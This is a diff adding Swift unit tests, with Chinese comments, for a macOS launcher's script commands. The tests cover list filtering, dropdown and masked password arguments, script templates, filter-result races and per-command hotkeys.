+        {"title": "纯文字", "arg": "粘贴的", "text": {"copy": "复制的"}}
+      ]}
+      """
+    let rows = LauncherModel.resultRows(
+      .init(end: .finished(0), output: output), of: script, keyword: "PR")
+    let model = try model(script)
+    #expect(rows.map { model.primaryAction(for: $0).title } == ["打开", "打开", "粘贴"])
+    #expect(
+      rows.map { model.commandReturnAction(for: $0)?.title } == ["复制网址", "在访达中显示", "只复制，不粘贴"])
+    #expect(rows.map { model.copyTitle(for: $0) } == ["复制网址", "复制路径", "复制结果"])
+    // ⇥ 接在打的关键词后面；文件结果没写图标时用它在访达里的图标
+    #expect(LauncherModel.completion(for: rows[0]) == "PR 12")
+    #expect(rows[0].scriptIcon == .symbol("arrow.triangle.pull"))
+    #expect(rows[1].scriptIcon == .file("/tmp/说明.md"))
+    #expect(
+      LauncherModel.resultFile(rows[1]) == "/tmp/说明.md" && LauncherModel.resultFile(rows[0]) == nil)
+    // ⌘K：文件有快速查看、复制路径另列；纯文字写了 text.copy 的复制也另列
+    let fileActions = model.actions(for: rows[1]).map(\.title)
+    #expect(fileActions.contains("快速查看") && fileActions.contains("复制路径"))
+    #expect(model.actions(for: rows[2]).map(\.title).contains("复制结果"))
+    // 网址的 ⌘↩ 就是复制网址：不重复列
+    #expect(model.actions(for: rows[0]).filter { $0.title == "复制网址" }.count == 1)
+  }
+
+  @Test func filterRunsOnceAndFiltersWithPinyin() async throws {
+    var script = ScriptCommand(path: "/s/proj.sh", title: "项目", interpreter: ["/bin/sh"])
+    script.keyword = "pj"
+    script.mode = .list
+    script.filters = true
+    let model = try model(script)
+    var runs: [[String]] = []
+    model.runScript = { _, arguments, _ in
+      runs.append(arguments)
+      return .init(end: .finished(0), output: "猫咪工具\tkitty-tools\n网站\tsite\nKitty Clear\tclear\n")
+    }
+    model.query = "pj "
+    await model.listRun()
+    #expect(model.results.prefix(3).map(\.title) == ["猫咪工具", "网站", "Kitty Clear"])
+    model.query = "pj m"
+    model.query = "pj mmgj"
+    await model.listRun()
+    // 拼音首字母
+    #expect(model.results.first?.title == "猫咪工具")
+    model.query = "pj clear"
+    #expect(model.results.first?.title == "Kitty Clear")
+    #expect(!model.results.contains { $0.title == "网站" })
+    #expect(runs == [[]])
+    // 收起后下次呼出重跑
+    model.didHide()
+    model.query = "pj "
+    await model.listRun()
+    #expect(runs.count == 2)
+  }
+
+  @Test func filterFailureIsNotFiltered() async throws {
+    var script = ScriptCommand(path: "/s/f.sh", title: "过滤", interpreter: ["/bin/sh"])
+    script.keyword = "ff"
+    script.mode = .list
+    script.filters = true
+    let model = try model(script)
+    model.runScript = { _, _, _ in .init(end: .finished(3), output: "", error: "没网\n") }
+    model.query = "ff abc"
+    #expect(model.results.first?.title == "正在运行「过滤」…")
+    await model.listRun()
+    // 没跑成的那一行不按打的字过滤
+    #expect(model.results.first?.title == "「过滤」出错了" && model.results.first?.subtitle == "没网")
+    model.query = "ff xyz"
+    #expect(model.results.first?.title == "「过滤」出错了")
+  }
+
+  @Test func autocompleteRerunsNormalLists() async throws {
+    var script = ScriptCommand(path: "/s/dir.sh", title: "目录", interpreter: ["/bin/sh"])
+    script.keyword = "dir"
+    script.mode = .list
+    let model = try model(script)
+    var calls: [[String]] = []
+    model.runScript = { _, arguments, _ in
+      calls.append(arguments)
+      return .init(
+        end: .finished(0), output: #"{"items": [{"title": "src", "autocomplete": "src/"}]}"#)
+    }
+    model.query = "dir "
+    await model.listRun()
+    model.complete()
+    #expect(model.query == "dir src/")
+    await model.listRun()
+    #expect(calls == [[], ["src/"]])
+  }
+}
+
+/// 第三轮 C1–C3、D2：下拉 / 引号 / 密码参数，新建脚本的模板
+@MainActor struct ScriptArgumentRoundThreeTests {
+  private func model(_ script: ScriptCommand) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    return model
+  }
+
+  @Test func quotedArguments() {
+    #expect(ScriptCommand.split(#""New York" London"#, into: 2) == ["New York", "London"])
+    #expect(ScriptCommand.split("“纽 约” 伦敦 东", into: 2) == ["纽 约", "伦敦 东"])
+    #expect(ScriptCommand.split(#"a "b c""#, into: 2) == ["a", "b c"])
+    #expect(ScriptCommand.split(#""a b" "c" d"#, into: 3) == ["a b", "c", "d"])
+    // 一个参数的照旧整段
+    #expect(ScriptCommand.split(#""a b""#, into: 1) == [#""a b""#])
+    // 没配上的引号：后面的都算这一段（还在打引号里的字）
+    #expect(ScriptCommand.split(#""a b"#, into: 2) == ["a b"])
+    #expect(ScriptCommand.quoted("New York") == #""New York""# && ScriptCommand.quoted("x") == "x")
+    #expect(ScriptCommand.quoted(#"say "hi" now"#) == #"“say "hi" now”"#)
+  }
+
+  @Test func parsesDropdownAndPassword() throws {
+    let text = #"""
+      #!/bin/sh
+      # @raycast.argument1 {"type": "dropdown", "placeholder": "设备", "data": [{"title": "耳机", "value": "headphones"}, {"title": "Studio Display", "value": "display"}]}
+      # @raycast.argument2 {"type": "password", "placeholder": "令牌"}
+      # @raycast.argument3 {"type": "dropdown", "placeholder": "空的", "data": []}
+      """#
+    let script = try #require(ScriptCommand.parse(text, path: "/s/out.sh")).get()
+    #expect(script.arguments[0].options.map(\.value) == ["headphones", "display"])
+    #expect(script.arguments[1].isSecret && script.hasSecret)
+    #expect(script.arguments[2].options.isEmpty)
+    #expect(script.passed(["studio display", "t0k", "x"]) == ["display", "t0k", "x"])
+    #expect(script.invalidChoice(["耳机", "t"]) == nil && script.invalidChoice(["音箱", "t"]) == 0)
+  }
+
+  @Test func dropdownOffersChoicesThenRuns() async throws {
+    var script = ScriptCommand(path: "/s/out.sh", title: "切换输出", interpreter: ["/bin/sh"])
+    script.keyword = "out"
+    script.arguments = [
+      .init(
+        placeholder: "设备",
+        options: [
+          .init(title: "耳机", value: "headphones"), .init(title: "Studio Display", value: "display"),
+        ]),
+      .init(placeholder: "音量", isOptional: true),
+    ]
+    let model = try model(script)
+    var passed: [[String]] = []
+    model.runScript = { script, arguments, _ in
+      passed.append(script.passed(arguments))
+      return .init(end: .finished(0))
+    }
+    model.query = "out "
+    // 选项排在前面，脚本那一行在后面写着要选
+    #expect(model.results.prefix(3).map(\.title) == ["耳机", "Studio Display", "切换输出"])
+    #expect(model.results[2].subtitle == "从下面选一个「设备」")
+    model.query = "out stu"
+    #expect(model.results.first?.title == "Studio Display")
+    model.execute(try #require(model.results.first))
+    #expect(model.query == #"out "Studio Display" "#)
+    model.query = #"out "Studio Display""#
+    let row = try #require(model.results.first)
+    #expect(row.kind == .script && row.arguments == ["Studio Display"])
+    model.execute(row)
+    await model.scriptRun(script.path)
+    #expect(passed == [["display"]])
+    // 不是选项的：只响提示音，副标题写能选什么
+    model.query = "out 音箱 5"
+    #expect(model.results.first?.subtitle == "「音箱」不是「设备」能选的：耳机 / Studio Display")
+    #expect(model.isMissingArguments(try #require(model.results.first)))
+  }
+
+  @Test func passwordIsMaskedClearedAndNotRecorded() async throws {
+    var script = ScriptCommand(path: "/s/tok.sh", title: "存令牌", interpreter: ["/bin/sh"])
+    script.keyword = "tok"
+    script.mode = .full
+    script.arguments = [.init(placeholder: "名字"), .init(placeholder: "令牌", isSecret: true)]
+    let model = try model(script)
+    model.runScript = { _, _, _ in .init(end: .finished(0), output: "ok\n") }
+    model.query = "tok github s3cret"
+    let row = try #require(model.results.first)
+    #expect(row.subtitle == "「github」 •••")
+    model.execute(row)
+    // 全文输出时启动器留着：搜索框已经清空，密码不留在上面
+    #expect(model.query.isEmpty && model.output?.isRunning == true)
+    await model.scriptRun(script.path)
+    #expect(model.usage.boost(for: row, query: "tok github s3cret").query == 0)
+    #expect(model.usage.boost(for: row, query: "tok").query > 0)
+    // 打着密码没跑就收起：不留到下次呼出
+    model.closeOutput()
+    model.query = "tok github s3cret"
+    model.didHide()
+    #expect(model.query.isEmpty)
+  }
+
+  @Test func templatesParseAndRun() async throws {
+    let folder = FileManager.default.temporaryDirectory.appending(path: "kitty-new-\(UUID())")
+    try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+    defer { try? FileManager.default.removeItem(at: folder) }
+    for language in ScriptLibrary.Language.allCases {
+      for mode in ScriptCommand.Mode.allCases {
+        let text = ScriptLibrary.template(
+          title: "试试", keyword: "try", mode: mode, language: language)
+        let parsed = try #require(ScriptCommand.parse(text, path: "/s/try.sh")).get()
+        #expect(parsed.title == "试试" && parsed.keyword == "try" && parsed.mode == mode)
+        #expect(ScriptCommand.revealed(text).hasHidden == false)
+      }
+    }
+    // 自带解释器的三种真跑一遍：岛上那句、列表两条
+    for language in [ScriptLibrary.Language.zsh, .javascript, .applescript] {
+      for mode in [ScriptCommand.Mode.island, .list] {
+        let text = ScriptLibrary.template(title: "试试", keyword: nil, mode: mode, language: language)
+        let url = folder.appending(
+          path: "\(language.rawValue)-\(mode.rawValue).\(language.fileExtension)")
+        try text.write(to: url, atomically: true, encoding: .utf8)
+        let script = try #require(ScriptCommand.parse(text, path: url.path)).get()
+        let outcome = await ScriptRunner.run(script, arguments: [], path: "/usr/bin:/bin")
+        #expect(outcome.succeeded, "\(language) \(mode)：\(outcome.error)")
+        if mode == .list {
+          #expect(
+            ScriptCommand.lines(outcome.output).map(\.title) == ["第一条", "第二条"], "\(language)")
+        } else {
+          #expect(ScriptCommand.lastLine(outcome.output)?.hasPrefix("你好") == true, "\(language)")
+        }
+      }
+    }
+    #expect(ScriptLibrary.newFileName(title: "查/天气", keyword: nil, language: .python) == "查-天气.py")
+    #expect(
+      ScriptLibrary.newFileName(title: "x", keyword: "ip-v4", language: .javascript) == "ip-v4.js")
+    #expect(ScriptLibrary.newFileName(title: "..", keyword: "中文", language: .zsh) == "新脚本.sh")
+  }
+}
+
+/// 第 2 批评审：自己过滤的列表脚本的结果晚到、跑失败，不打扰别的查询和别的脚本
+@MainActor struct ScriptFilterRaceTests {
+  private func filterScript(_ keyword: String, path: String) -> ScriptCommand {
+    var script = ScriptCommand(path: path, title: "项目", interpreter: ["/bin/sh"])
+    script.keyword = keyword
+    script.mode = .list
+    script.filters = true
+    return script
+  }
+
+  @Test func lateFilterResultLeavesOtherQueriesAlone() async throws {
+    let slow = filterScript("pj", path: "/s/pj.sh")
+    var other = ScriptCommand(path: "/s/b64.sh", title: "编码", interpreter: ["/bin/sh"])
+    other.keyword = "b64"
+    other.mode = .list
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [slow, other] }
+    var hold: CheckedContinuation<Void, Never>?
+    var otherRuns = 0
+    model.runScript = { script, _, _ in
+      if script.path == slow.path {
+        await withCheckedContinuation { hold = $0 }
+        return .init(end: .finished(0), output: "猫咪\n")
+      }
+      otherRuns += 1
+      return .init(end: .finished(0), output: "a\nb\nc\n")
+    }
+    model.query = "pj "
+    for _ in 0..<40 where hold == nil { await Task.yield() }
+    model.query = "b64 x"
+    // listRun 也等那条还压着的过滤脚本：这里只等另一条的结果出来
+    for _ in 0..<300 where model.results.first?.title != "a" {
+      try await Task.sleep(for: .milliseconds(10))
+    }
+    #expect(model.results.prefix(3).map(\.title) == ["a", "b", "c"])
+    model.selection = 2
+    hold?.resume()
+    await model.listRun()
+    for _ in 0..<20 { await Task.yield() }
+    // 晚到的过滤结果不重搜：选中还在第三行，另一条列表脚本没被重跑
+    #expect(model.selection == 2 && otherRuns == 1)
+    // 结果记下了：再打回来不用再跑
+    model.query = "pj 猫"
+    #expect(model.results.first?.title == "猫咪")
+  }
+
+  @Test func failedFilterGivesWayAndRetries() async throws {
+    let time = filterScript("time", path: "/s/time.sh")
+    let app = LauncherItem(
+      kind: .app, target: "/System/Applications/Time Machine.app", title: "Time Machine",
+      subtitle: "", names: [LauncherMatch.fold("Time Machine")])
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [app])
+    model.scripts = { [time] }
+    var runs = 0
+    model.runScript = { _, _, _ in
+      runs += 1
+      return .init(end: .timedOut)
+    }
+    model.query = "time machine"
+    await model.listRun()
+    // 下面有别的结果：不留那行错误（↩ 打开时间机器，不是响提示音）
+    #expect(model.results.first?.title == "Time Machine")
+    // 接着打不重跑（这次呼出里记着没跑成）
+    model.query = "time mach"
+    #expect(runs == 1)
+    // 离开这条脚本再打回来：重跑一次
+    model.query = "t"
+    model.query = "time "
+    await model.listRun()
+    #expect(runs == 2)
+  }
+
+  @Test func openTargetsParseFromLooseInput() {
+    let json = """
+      {"items": [
+        {"title": "a", "url": "/tmp/a.txt"},
+        {"title": "b", "url": "file:~/b"},
+        {"title": "c", "type": "file", "path": "", "arg": "/tmp/c"},
+        {"title": "d", "url": "github.com"},
+        {"title": "e", "url": "https://x.y", "valid": false}
+      ]}
+      """
+    let lines = ScriptCommand.lines(json, folder: "/s")
+    #expect(lines[0].opens == .file("/tmp/a.txt"))
+    #expect(lines[1].opens == .file(NSHomeDirectory() + "/b"))
+    #expect(lines[2].opens == .file("/tmp/c"))
+    #expect(lines[3].opens == nil)
+    let script = ScriptCommand(path: "/s/l.sh", title: "列表", interpreter: ["/bin/sh"])
+    let rows = LauncherModel.resultRows(.init(end: .finished(0), output: json), of: script)
+    // 不能选的不当能打开的
+    #expect(rows[4].opens == nil && rows[4].payload == nil)
+  }
+}
+
+/// 第 3 批评审：一个参数的下拉、列表里的下拉、选项按标题认、打到第几个、密码不拿去搜
+@MainActor struct ScriptArgumentReviewTests {
+  private func model(_ script: ScriptCommand) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    model.engines = { WebSearch.defaults }
+    return model
+  }
+
+  private func dropdown(_ titles: [(String, String)], placeholder: String = "设备")
+    -> ScriptCommand.Argument
+  {
+    .init(placeholder: placeholder, options: titles.map { .init(title: $0.0, value: $0.1) })
+  }
+
+  @Test func singleArgumentChoiceIsNotQuoted() async throws {
+    var script = ScriptCommand(path: "/s/out.sh", title: "输出", interpreter: ["/bin/sh"])
+    script.keyword = "out"
+    script.arguments = [dropdown([("Studio Display", "display"), ("耳机", "hp")])]
+    let model = try model(script)
+    var passed: [[String]] = []
+    model.runScript = { script, arguments, _ in
+      passed.append(script.passed(arguments))
+      return .init(end: .finished(0))
+    }
+    model.query = "out "
+    model.execute(try #require(model.results.first))
+    #expect(model.query == "out Studio Display")
+    let row = try #require(model.results.first)
+    #expect(row.kind == .script && !model.isMissingArguments(row))
+    model.execute(row)
+    await model.scriptRun(script.path)
+    #expect(passed == [["display"]])
+  }
+
+  @Test func listScriptWaitsForAValidChoice() async throws {
+    var script = ScriptCommand(path: "/s/l.sh", title: "列表", interpreter: ["/bin/sh"])
+    script.keyword = "ls"
+    script.mode = .list
+    script.arguments = [dropdown([("耳机", "hp"), ("音箱", "sp")])]
+    let model = try model(script)
+    var runs = 0
+    model.runScript = { _, _, _ in
+      runs += 1
+      return .init(end: .finished(0), output: "结果\n")
+    }
+    model.query = "ls e"
+    await model.listRun()
+    #expect(runs == 0 && model.results.first?.title == "耳机")
+    model.query = "ls 耳机"
+    await model.listRun()
+    #expect(runs == 1 && model.results.first?.title == "结果")
+  }
+
+  @Test func optionsMatchTitlesBeforeValuesAndTypingIndex() {
+    let argument = dropdown([("a", "b"), ("b", "c"), ("Dev", "1"), ("dev", "2")])
+    #expect(argument.option(for: "b")?.value == "c")
+    #expect(argument.option(for: "dev")?.value == "2" && argument.option(for: "DEV")?.value == "1")
+    var script = ScriptCommand(path: "/s/f.sh", title: "航班", interpreter: ["/bin/sh"])
+    script.keyword = "fly"
+    script.arguments = [.init(placeholder: "从"), .init(placeholder: "到")]
+    func typing(_ query: String) -> Int? {
+      ScriptCommand.invocation(for: query, in: [script], alias: { $0.keyword })?.typing
+    }
+    // 引号还没配上：还在第一个；最后一个参数里有空格：一直是最后一个
+    #expect(typing(#"fly "New "#) == 0)
+    #expect(ScriptCommand.split(#""New Yo"#, into: 2) == ["New Yo"])
+    #expect(typing("fly a New ") == 1 && typing("fly a ") == 1 && typing("fly ") == 0)
+    #expect(ScriptCommand.quoted("") == #""""#)
+  }
+
+  @Test func secretIsNotSearchedElsewhere() throws {
+    var script = ScriptCommand(path: "/s/t.sh", title: "令牌", interpreter: ["/bin/sh"])
+    script.keyword = "tok"
+    script.arguments = [.init(placeholder: "令牌", isSecret: true)]
+    let model = try model(script)
+    model.query = "tok s3cret"
+    let row = try #require(model.results.first)
+    model.alternate = .control
+    #expect(model.alternateSubtitle(for: row) == nil)
+    model.alternate = .option
+    #expect(model.alternateSubtitle(for: row) == nil)
+    model.alternate = .none
+  }
+
+  @Test func listTemplateDoesNotSuggestConfirm() throws {
+    let text = ScriptLibrary.template(title: "x", keyword: "x", mode: .list, language: .zsh)
+    #expect(!text.contains("@kitty.confirm") && text.contains("@kitty.filter"))
+  }
+}
+
+/// 第三轮 D1：「命令和别名」里每条命令的快捷键（读偏好的那段 JSON、哪些能注册、按下做什么）。不真注册热键（会吞用户的按键）
+@MainActor struct CommandHotKeyTests {
+  private func model(_ scripts: [ScriptCommand]) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { scripts }
+    // 不看 Dev 版偏好里改过的别名 / 关掉的
+    model.commandSettings = { .init() }
+    return model
+  }
+
+  @Test func storedHotKeysAreCheckedLikeTheRecorder() {
+    let good = HotKey(keyCode: kVK_ANSI_K, modifiers: cmdKey | optionKey)
+    let text = LauncherModel.text(of: [
+      "script:~/a.sh": good,
+      // 缺修饰键、通用编辑键、连按两下：都不认
+      "system:lock": HotKey(keyCode: kVK_ANSI_L, modifiers: 0),
+      "builtin:ip": HotKey(keyCode: kVK_ANSI_C, modifiers: cmdKey),
+      "builtin:cb": HotKey(doubleTap: .command),
+    ])
+    #expect(LauncherModel.commandHotKeys(fromText: text) == ["script:~/a.sh": good])
+    #expect(LauncherModel.commandHotKeys(fromText: "{bad json").isEmpty)
+    let many = Dictionary(uniqueKeysWithValues: (0..<300).map { ("script:\($0)", good) })
+    #expect(LauncherModel.commandHotKeys(fromText: LauncherModel.text(of: many)).count == 200)
+    #expect(LauncherModel.text(of: [:]).isEmpty)
+  }
+
+  @Test func onlyRunnableCommandsRegister() throws {
+    var script = ScriptCommand(
+      path: NSHomeDirectory() + "/s/a.sh", title: "甲", interpreter: ["/bin/sh"])
+    script.keyword = "a"
+    let model = try model([script])
+    let id = LauncherCommands.scriptID(script)
+    #expect(model.canRunHotKey(id))
+    #expect(!model.canRunHotKey("script:~/s/gone.sh"))
+    #expect(model.canRunHotKey("system:lock") && !model.canRunHotKey("system:nothing"))
+    #expect(model.canRunHotKey("builtin:kill"))
+    // 关掉的、别名清空了的关键词命令不注册
+    var settings = LauncherCommands.Settings()
+    settings.set(false, for: id)
+    settings.setAlias("", for: "builtin:kill", default: "kill")
+    model.commandSettings = { settings }
+    #expect(!model.canRunHotKey(id) && !model.canRunHotKey("builtin:kill"))
+  }
+
+  @Test func pressingRunsOrOpensTheLauncher() async throws {
+    var plain = ScriptCommand(path: "/s/plain.sh", title: "直接跑", interpreter: ["/bin/sh"])
+    plain.keyword = "pl"
+    var input = ScriptCommand(path: "/s/in.sh", title: "要参数", interpreter: ["/bin/sh"])
+    input.keyword = "tq"
+    input.arguments = [.init(placeholder: "城市")]
+    var guarded = ScriptCommand(path: "/s/rm.sh", title: "清空", interpreter: ["/bin/sh"])
+    guarded.keyword = "rm"
+    guarded.confirmation = "再按 ↩ 清空"
+    let model = try model([plain, input, guarded])
+    var shown = 0
+    model.showPanel = {
+      shown += 1
+      return true
+    }
+    var ran: [String] = []
+    model.runScript = { script, _, _ in
+      ran.append(script.title)
+      return .init(end: .finished(0))
+    }
+    var performed: [SystemControl.Action] = []
+    model.perform = { performed.append($0) }
+    // 不要参数、不用确认的：不打开启动器，直接跑
+    model.runHotKey(LauncherCommands.scriptID(plain))
+    await model.scriptRun(plain.path)
+    #expect(ran == ["直接跑"] && shown == 0)
+    // 要参数的：打开启动器、填好「关键词 空格」
+    model.runHotKey(LauncherCommands.scriptID(input))
+    #expect(shown == 1 && model.query == "tq ")
+    // 要确认的：打开启动器、选中它并上膛，不跑
+    model.runHotKey(LauncherCommands.scriptID(guarded))
+    #expect(shown == 2 && model.alternateSubtitle(for: model.results[model.selection]) == "再按 ↩ 清空")
+    #expect(ran == ["直接跑"])
+    // 关键词命令：打开启动器、填好关键词
+    model.runHotKey("builtin:kill")
+    #expect(model.query == "kill ")
+    // 不用确认的系统命令直接做
+    model.runHotKey("system:lock")
+    #expect(performed.count == 1)
+  }
+
+  @Test func hotKeyClosesTheMenuAndKeepsOtherRuns() async throws {
+    var guarded = ScriptCommand(path: "/s/rm.sh", title: "清空", interpreter: ["/bin/sh"])
+    guarded.keyword = "rm"
+    guarded.confirmation = "再按 ↩ 清空"
+    var slow = ScriptCommand(path: "/s/slow.sh", title: "慢的", interpreter: ["/bin/sh"])
+    slow.keyword = "slow"
+    slow.mode = .full
+    var quick = ScriptCommand(path: "/s/quick.sh", title: "快的", interpreter: ["/bin/sh"])
+    quick.keyword = "quick"
+    quick.mode = .full
+    let model = try model([guarded, slow, quick])
+    #expect(model.hasCommand(LauncherCommands.scriptID(slow)) && model.hasCommand("builtin:ip"))
+    #expect(!model.hasCommand("script:~/nowhere.sh") && !model.hasCommand("system:nothing"))
+    // ⌘K 菜单开着时按：菜单收起，上膛的那句看得见
+    model.query = "slow"
+    model.toggleActions()
+    #expect(model.showsActions)
+    model.runHotKey(LauncherCommands.scriptID(guarded))
+    #expect(!model.showsActions)
+    // 另一条全文脚本的那一页还在跑：交给岛，不停掉它
+    var hold: CheckedContinuation<Void, Never>?
+    model.runScript = { script, _, _ in
+      if script.path == slow.path { await withCheckedContinuation { hold = $0 } }
+      return .init(end: .finished(0), output: script.title + "\n")
+    }
+    model.query = "slow"
+    model.execute(try #require(model.results.first))
+    for _ in 0..<40 where hold == nil { await Task.yield() }
+    model.runHotKey(LauncherCommands.scriptID(quick))
+    await model.scriptRun(quick.path)
+    #expect(model.output?.text == "快的")
+    hold?.resume()
+    await model.scriptRun(slow.path)
+    #expect(model.lastOutput?.page.text == "慢的")
   }
 }
